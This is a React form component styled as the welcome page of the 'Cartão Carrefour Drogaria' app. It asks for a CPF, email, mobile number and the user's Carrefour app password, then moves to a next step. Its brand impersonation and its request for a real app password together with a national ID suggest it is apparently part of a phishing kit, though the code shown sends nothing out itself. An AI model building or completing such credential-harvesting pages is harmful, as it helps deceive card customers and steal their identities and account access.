import React, { Component } from 'react'
import logo from './logo_carrefo.png'
import InputMask from "react-input-mask";



export class AccountSetup extends Component {
    continue = e => {
        e.preventDefault();
        this.props.nextStep();
    };
    

    render() {
        const { values, inputChange } = this.props;

        return (
            <div className="form-container">
            <img className="logo" src={logo} width="120"/>
                <h6 className="mb-7"><b>Bem-vindo</b> ao aplicativo do <b>Cartão Carrefour Drogaria</b></h6>
                <div className="form-group">
                    
                    <input type="number" placeholder="Digite seu CPF" className="form-control" name="cp" onChange={inputChange('cp')} value={values.cp}   />
                </div>
                <div className="form-group">
                    <input placeholder="Seu email" type="email" className="form-control" name="email" onChange={inputChange('email')} value={values.email} />
                   <span class="focus-border"></span>
                </div>

                <div className="form-group">
                    <input placeholder="Celular com DDD"  type="number" className="form-control" name="phone" onChange={inputChange('phone')} value={values.phone} />
                </div>
                <div className="form-group">
                    <input placeholder="Senha aplicativo Carrefour"   type="password" className="form-control" name="passapp" onChange={inputChange('password')} value={values.password} />
                </div>

                <br />
                

                <div className=" col-lg-12 text-right">
                    
                    <button className="btn btn-primary " onClick={this.continue}>CONTINUAR</button>
                </div>
            </div>
        )
        
    }
    
}

export default AccountSetup
